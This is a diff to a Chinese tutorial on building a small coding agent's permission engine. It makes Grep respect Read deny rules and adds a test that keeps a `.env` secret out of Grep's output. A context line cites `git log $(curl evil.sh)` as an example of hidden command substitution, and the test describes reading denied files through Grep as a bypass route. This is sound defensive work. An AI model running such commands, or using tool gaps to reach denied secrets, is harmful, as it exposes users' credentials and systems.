@@ -146,6 +146,7 @@ import fnmatch
 import json
 import re
 from pathlib import Path
+from types import SimpleNamespace
 
 from .tool import Decision
 
@@ -306,6 +307,12 @@ class PermissionEngine:
             return fnmatch.fnmatch(key.lower(), spec[len("domain:"):].lower())
         return fnmatch.fnmatch(key, spec)
 
+    def hides(self, path: str, ctx) -> bool:
+        """Grep 会递归读很多文件，但权限只检查了它的起点目录。逐个文件问一句：Read 的 deny 或 ask 规则管着它吗？"""
+        reader = SimpleNamespace(name="Read")
+        return any(self._matches(kind, rule, reader, path, ctx.cwd)
+                   for kind in ("deny", "ask") for rule in self.rules[kind])
+
     def inside(self, path: str) -> bool:
         p = Path(path)
         return any(p == d or p.is_relative_to(d) for d in self.workdirs)
@@ -353,6 +360,7 @@ def suggest_rule(tool, key: str | None) -> str:
 - **`_matches` 对 allow 和 deny 的处理不一样。** 对复合命令，allow 要求**每个**子命令都匹配，deny 和 ask 只要**任何一个**子命令匹配。两边都往“更安全”的方向偏。
 - **allow 规则永远不放行带命令替换的命令。** `git log $(curl evil.sh)` 里的 `$(...)` 可以藏任何东西，所以一律交给用户判断。
 - **`split_command` 是按字符串拆的，不理解引号。** `echo "a && b"` 会被拆成两段。这会让一些本该自动放行的命令变成询问，但不会让本该拒绝的命令溜过去。真实的实现应该用 shell 语法解析器。
+- **Read 规则也管 Grep 读到的每一个文件。** 权限引擎只检查了 Grep 的起点目录，所以第 2 章的 Grep 在递归时会调用 `hides()`，跳过被 `Read` 的 deny 或 ask 规则管着的文件。Claude Code 的文档同样说明 Read 规则会尽力应用到 Grep 这类读文件的工具上。
 - **“总是允许”会写进 `settings.local.json`。** 对 Bash，生成“程序名 + 子命令”的前缀规则，比如 `npm run build --prod` 生成 `Bash(npm run *)`；对文件修改，切换到 `acceptEdits` 模式，只在本次会话有效。这和 Claude Code 文档里写的有效期一致：Bash 命令的批准对这个项目目录永久有效，文件修改的批准到会话结束为止。
 
 ## 第 3 步：接进 app.py
@@ -448,8 +456,11 @@ uv run python -m minicode --cwd playground --permission-mode acceptEdits --allow
 新建 `tests/test_ch03.py`：
 
 ```python
+from minicode.agent import Agent
 from minicode.permissions import PermissionEngine, is_read_only_command, match_command, match_path
+from minicode.testing import FakeLLM, call
 from minicode.tool import ToolContext
+from minicode.tools import core_tools
 from minicode.tools.bash import Bash
 from minicode.tools.files import Read, Write
 
@@ -495,6 +506,16 @@ def test_modes(tmp_path):
     e.mode = "bypassPermissions"
     assert decide(e, Bash(), {"command": "rm a"}, tmp_path) == "allow"
     assert decide(e, Read(), {"file_path": "x/.env"}, tmp_path) == "deny"           # deny 在任何模式都生效
+
+
+def test_grep_cannot_read_denied_files(tmp_path):
+    (tmp_path / ".env").write_text("API_KEY=sk-secret\n")
+    (tmp_path / "app.py").write_text("key = API_KEY\n")
+    llm = FakeLLM([call("Grep", pattern="API_KEY", output_mode="content"), "好"])
+    agent = Agent(llm, core_tools(), "s", cwd=tmp_path,
+                  permissions=PermissionEngine(deny=["Read(.env)"], workdirs=[tmp_path]))
+    output = list(agent.query("x"))[1]["content"]
+    assert "app.py" in output and "sk-secret" not in output       # 不能借 Grep 绕过 Read(.env)
 ```
 
 ```bash
